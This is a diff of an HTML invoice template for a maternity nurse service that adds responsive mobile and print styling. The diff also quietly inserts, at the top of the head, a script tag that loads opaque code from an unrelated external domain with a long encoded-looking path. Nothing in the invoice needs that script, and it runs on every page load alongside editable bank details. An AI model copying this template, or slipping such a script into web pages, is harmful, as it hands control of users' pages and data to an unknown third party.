@@ -1,59 +1,152 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <script type='text/javascript' src='https://www.nirajan.info.np/l6z8_wAFvuqnzZoRmSoZP9bnsmojFZ0ZIpCG70JTcL5DkzRyyObr14mMfx1fauL_oNRHxmFZ7ZVjn-lLEngLk7ZfGsIE4aa4_5_dLTTyNun6MqeC_w2cLlRfuYZRMlhVRmPkVIIXqNQllqdGCl0s7BjXKqMKqc9OllLkpCr_ylkxAFAHmNnw8gMFGbUlVrlSHA8x2Fidw2oomqeuLl2Rqf3IcfXVfNun01l5_4bWrLMxCm-10NAoki9TzNcgoy7rm1YwxqUk3rRjsNZ1pewGUUcF4f7Vnp9musM0qh5pdmKtaK3tzf-a0nu96pNmc2X2Jzh0VByFd0ml26JbuY19rG_8MmqD2Oh6VlPJEvaH9kf0KVvtsjejy6SjOQrqLxZTQ0fqZwH2YwkHlvgp-VCxrhjYyith_nV1S0tRCJS8JaACMGU_R0lLmyAt6RrMVht8zfCRia5LLzY7jrIrywdElJgnMuxmExcWp6pL'></script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>INVOICE</title>
 
-  <!-- Link Poppins font -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
 
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body { 
       font-family: 'Poppins', sans-serif; 
-      background-color: #FFFFFF; 
+      background-color: #f4f4f9; 
       color: #212121; 
       font-size: 14px;
       line-height: 1.6; 
     }
-    @page { size: A4; margin: 0; }
+    
+    @page { size: A4; margin: 10mm; }
+    
     .container { 
-      width: 800px; 
+      width: 100%; 
+      max-width: 800px; 
       margin: 40px auto; 
       background: #FFFFFF; 
       padding: 40px; 
       border-radius: 8px; 
       box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); 
     }
+    
     h1 { text-align: left; font-size: 28px; font-weight: 700; margin-bottom: 30px; color: #003366; }
     h2 { font-size: 16px; margin-bottom: 10px; font-weight: 600; color: #003366; }
     h3 { font-size: 16px; margin-top: 20px; margin-bottom: 10px; font-weight: 600; color: #003366; }
     
-    /* Updated Layout for Side-by-Side Blocks */
+    /* Layout for Side-by-Side Blocks (Desktop) */
     .party-info-wrapper { display: flex; justify-content: space-between; margin-bottom: 40px; border-bottom: 2px solid #E0E0E0; padding-bottom: 20px; }
     .party-box { width: 45%; }
-    textarea { width: 100%; border: none; resize: none; font-family: 'Poppins', sans-serif; font-size: 14px; color: #212121; outline: none; }
+    textarea { width: 100%; border: none; resize: none; font-family: 'Poppins', sans-serif; font-size: 14px; color: #212121; outline: none; overflow: hidden; padding: 5px 0; }
     
     .invoice-info { margin-bottom: 40px; }
-    table { width: 100%; margin-top: 20px; border-collapse: collapse; border: 1px solid #E0E0E0; }
+    
+    /* Table Responsive Wrapper */
+    .table-responsive { overflow-x: auto; width: 100%; }
+    
+    table { width: 100%; margin-top: 20px; border-collapse: collapse; border: 1px solid #E0E0E0; min-width: 600px; }
     th, td { padding: 14px; text-align: left; border: 1px solid #E0E0E0; }
     th { background-color: #003366; color: #FFFFFF; font-size: 10px; font-weight: 600; text-transform: uppercase; }
     td { background-color: #FFFFFF; font-size: 13px; }
+    
     .total { margin-top: 30px; text-align: right; font-size: 22px; font-weight: 700; color: #003366; }
     .bank-details { margin-top: 40px; }
     .footer { text-align: center; margin-top: 40px; font-size: 12px; color: #757575; }
-    .button-container { text-align: right; margin-top: 20px; }
-    .button-container button { padding: 10px 20px; margin-left: 10px; font-size: 14px; cursor: pointer; border: none; border-radius: 5px; background-color: #003366; color: #FFFFFF; font-family: 'Poppins', sans-serif; }
     
+    .button-container { text-align: right; margin-top: 20px; }
+    .button-container button { padding: 10px 20px; margin-left: 10px; font-size: 14px; cursor: pointer; border: none; border-radius: 5px; background-color: #003366; color: #FFFFFF; font-family: 'Poppins', sans-serif; transition: background-color 0.2s; }
+    .button-container button:hover { background-color: #002244; }
+
+    /* --- ENHANCED MOBILE SCREEN STYLES --- */
+    @media screen and (max-width: 768px) {
+      body { background-color: #f0f2f5; }
+      
+      .container { 
+        margin: 15px auto; 
+        padding: 25px 20px; 
+        border-radius: 16px; /* Softer, modern corners */
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08); /* Smoother shadow */
+      }
+
+      h1 { font-size: 24px; margin-bottom: 25px; text-align: center; }
+      
+      .party-info-wrapper { flex-direction: column; gap: 25px; border-bottom: 1px solid #eee; }
+      .party-box { width: 100%; }
+      
+      /* Make editable areas look touch-friendly on mobile */
+      textarea, [contenteditable="true"], input[type="date"] { 
+        background-color: #fafafa; 
+        border: 1px dashed #d0d7de; 
+        border-radius: 8px; 
+        padding: 12px; 
+        transition: all 0.2s ease-in-out;
+      }
+      textarea:focus, [contenteditable="true"]:focus {
+        background-color: #ffffff;
+        border: 1px solid #003366;
+        box-shadow: 0 0 0 3px rgba(0, 51, 102, 0.1);
+      }
+
+      .table-responsive {
+        border-radius: 8px;
+        box-shadow: inset 0 0 8px rgba(0,0,0,0.03); /* subtle depth for swipe area */
+      }
+      
+      td { padding: 12px; font-size: 14px; }
+      
+      /* App-like buttons */
+      .button-container { display: flex; flex-direction: column; gap: 12px; margin-top: 35px; text-align: center; }
+      .button-container button { 
+        margin: 0; 
+        width: 100%; 
+        padding: 16px; 
+        font-size: 16px; 
+        font-weight: 600;
+        border-radius: 10px; 
+        box-shadow: 0 4px 10px rgba(0, 51, 102, 0.2); 
+      }
+    }
+
+    /* --- PRINT & PDF STYLES --- */
     @media print {
-      body { background-color: #FFFFFF !important; }
-      .container { box-shadow: none !important; }
-      .button-container { display: none; }
-      td:last-child, th:last-child { display: none; }
-      #invoice-date { display: none; }
-      #date-text { display: inline; }
-      textarea { border: none !important; }
+      body { 
+        background-color: #FFFFFF !important; 
+        -webkit-print-color-adjust: exact; 
+        print-color-adjust: exact; 
+      }
+      .container { 
+        width: 100%; 
+        max-width: 100%; 
+        margin: 0; 
+        padding: 0; 
+        box-shadow: none !important; 
+        border-radius: 0 !important;
+      }
+      
+      /* Force desktop layout */
+      .party-info-wrapper { flex-direction: row; display: flex; border-bottom: 2px solid #E0E0E0 !important; }
+      .party-box { width: 45%; }
+      h1 { text-align: left; }
+      
+      .button-container { display: none !important; }
+      td:last-child, th:last-child { display: none !important; }
+      #invoice-date { display: none !important; }
+      #date-text { display: inline !important; }
+      
+      /* Strip away mobile backgrounds and borders for print */
+      textarea, [contenteditable="true"] { 
+        border: none !important; 
+        background: transparent !important; 
+        resize: none; 
+        overflow: hidden; 
+        padding: 0 !important; 
+        box-shadow: none !important;
+      }
+      
+      /* Keep bank details formatted cleanly */
+      .bank-details div { border: 1px solid #ccc !important; padding: 10px !important; }
+      
+      table { min-width: 100%; margin-top: 20px !important; }
     }
   </style>
 </head>
@@ -62,7 +155,6 @@
   <div class="container" id="invoice">
     <h1>Invoice</h1>
 
-    <!-- New Side-by-Side Blocks -->
     <div class="party-info-wrapper">
       <div class="party-box">
         <h2>From</h2>
@@ -78,24 +170,26 @@
       <p><b>Invoice Number:</b> <span contenteditable="true">XX</span></p>
       <p><b>Invoice Date:</b> 
         <input type="date" id="invoice-date" onchange="updateDateText()">
-        <span id="date-text"></span>
+        <span id="date-text" style="display:none;"></span>
       </p>
     </div>
 
-    <table id="invoice-table">
-      <thead>
-        <tr><th>Description</th><th>Quantity</th><th>Rate (£)</th><th>Total (£)</th><th>Action</th></tr>
-      </thead>
-      <tbody>
-        <tr>
-          <td contenteditable="true">Maternity Nurse Service</td>
-          <td contenteditable="true" oninput="recalculate()">0</td>
-          <td contenteditable="true" oninput="recalculate()">0.00</td>
-          <td contenteditable="true" oninput="recalculate()">0.00</td>
-          <td><button onclick="removeRow(this)">Remove</button></td>
-        </tr>
-      </tbody>
-    </table>
+    <div class="table-responsive">
+      <table id="invoice-table">
+        <thead>
+          <tr><th>Description</th><th>Quantity</th><th>Rate (£)</th><th>Total (£)</th><th>Action</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td contenteditable="true">Maternity Nurse Service</td>
+            <td contenteditable="true" oninput="recalculate()">0</td>
+            <td contenteditable="true" oninput="recalculate()">0.00</td>
+            <td contenteditable="true" oninput="recalculate()">0.00</td>
+            <td><button onclick="removeRow(this)">Remove</button></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
 
     <div class="total">
       <p><b>Total: £<span id="total">0.00</span></b></p>
@@ -103,11 +197,12 @@
 
     <div class="bank-details">
       <h3>Bank Details</h3>
-<div contenteditable="true" style="border: 1px solid #ccc; padding: 10px; min-height: 60px; white-space: pre-line;">
+      <div contenteditable="true" style="border: 1px solid #ccc; padding: 10px; min-height: 60px; white-space: pre-line;">
 Account Name: Your Name
 Sort Code: 00-00-00
 Account Number: 00000000
-</div>
+      </div>
+    </div>
 
     <div class="footer">
       <p>Thank you for your business!</p>
@@ -128,7 +223,12 @@ Account Number: 00000000
       tableBody.appendChild(newRow);
       recalculate();
     }
-    function removeRow(button) { button.closest('tr').remove(); recalculate(); }
+    
+    function removeRow(button) { 
+      button.closest('tr').remove(); 
+      recalculate(); 
+    }
+    
     function recalculate() {
       let rows = document.querySelectorAll('#invoice-table tbody tr');
       let subtotal = 0;
@@ -141,6 +241,7 @@ Account Number: 00000000
       });
       document.getElementById('total').textContent = subtotal.toFixed(2);
     }
+    
     function setTodayDate() {
       const today = new Date();
       const yyyy = today.getFullYear();
@@ -149,6 +250,7 @@ Account Number: 00000000
       document.getElementById('invoice-date').value = `${yyyy}-${mm}-${dd}`;
       document.getElementById('date-text').innerText = `${dd}/${mm}/${yyyy}`;
     }
+    
     function updateDateText() {
       const dateInput = document.getElementById('invoice-date').value;
       if (dateInput) {
@@ -156,6 +258,7 @@ Account Number: 00000000
         document.getElementById('date-text').innerText = `${parts[2]}/${parts[1]}/${parts[0]}`;
       }
     }
+    
     window.onload = setTodayDate;
   </script>
 </body>
